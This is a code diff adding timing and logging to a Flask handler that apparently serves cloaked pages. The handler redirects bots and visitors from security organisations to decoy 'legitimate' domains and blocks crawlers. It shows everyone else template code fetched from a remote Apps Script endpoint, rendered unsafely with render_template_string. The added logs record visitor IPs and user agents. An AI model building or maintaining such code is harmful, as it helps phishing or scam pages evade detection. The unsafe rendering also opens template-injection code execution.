@@ -2,6 +2,7 @@ import requests
 import json
 import random
 import re
+import time
 from flask import render_template_string, request, redirect
 from dotenv import load_dotenv
 import os
@@ -69,6 +70,7 @@ class PageTemplateHandler:
 
     def verify_page_visit(self, complete_url, path):
         try:
+            start_time = time.time()
             headers = {
                 'Content-Type': 'application/x-www-form-urlencoded'
             }
@@ -80,6 +82,8 @@ class PageTemplateHandler:
                 'ipData': request.remote_addr
             }
             response = requests.post(self.APPSCRIPT_URL, headers=headers, data=payload)
+            elapsed = int((time.time() - start_time) * 1000)
+            logger.info("verify_page_visit path=%s status=%s in %dms", path, response.status_code, elapsed)
             if response.status_code != 200:
                 return {
                     'success': False,
@@ -92,11 +96,14 @@ class PageTemplateHandler:
                 }
             data = response.json()
             if data.get('success'):
+                code_len = len(data.get('templateCode') or '')
+                logger.info("verify_page_visit path=%s SUCCESS templateCodeLen=%s", path, code_len)
                 return {
                     'success': True,
                     'templateCode': data.get('templateCode'),
                     'status': data.get('status', 'active')
                 }
+            logger.warning("verify_page_visit path=%s FAILED error=%s", path, data.get('error', 'unknown'))
             return {
                 'success': False,
                 'error': data.get('error', 'Invalid response from server')
@@ -109,23 +116,29 @@ class PageTemplateHandler:
             }
 
     def handle_page_template(self, path):
+        start_time = time.time()
         visitor_ip = request.remote_addr
         user_agent = request.headers.get('User-Agent', '')
+        logger.info("handle_page_template path=%s ip=%s ua=%s", path, visitor_ip, user_agent[:80])
         
         try:
             ip_info = requests.get(f'https://ipinfo.io/{visitor_ip}/json').json()
             org_info = ip_info.get('org', '')
+            logger.info("handle_page_template path=%s ipinfo org=%s", path, org_info)
             
             if self.is_bot_or_org(visitor_ip, user_agent, org_info):
+                logger.info("handle_page_template path=%s BOT/ORG detected, redirecting", path)
                 return redirect(random.choice(self.LEGITIMATE_DOMAINS)), None
                 
         except Exception as e:
             logger.error("Error checking IP info: %s", e)
 
         if not user_agent or "bot" in user_agent.lower() or "crawler" in user_agent.lower():
+            logger.info("handle_page_template path=%s BLOCKED: bot UA", path)
             return None, "Access denied: Suspicious activity detected"
 
         if self.is_ip_flagged(visitor_ip):
+            logger.info("handle_page_template path=%s BLOCKED: flagged IP", path)
             return None, "Access denied: Suspicious activity detected"
 
         try:
@@ -133,8 +146,10 @@ class PageTemplateHandler:
             page_data = self.verify_page_visit(complete_url, path)
             
             if not page_data['success']:
+                logger.warning("handle_page_template path=%s FAILED verifyPageVisit: %s", path, page_data.get('error'))
                 return None, page_data['error']
-            
+
+            logger.info("handle_page_template path=%s RENDER ok total=%dms", path, int((time.time() - start_time) * 1000))
             return render_template_string(page_data['templateCode']), None
             
         except Exception as e:
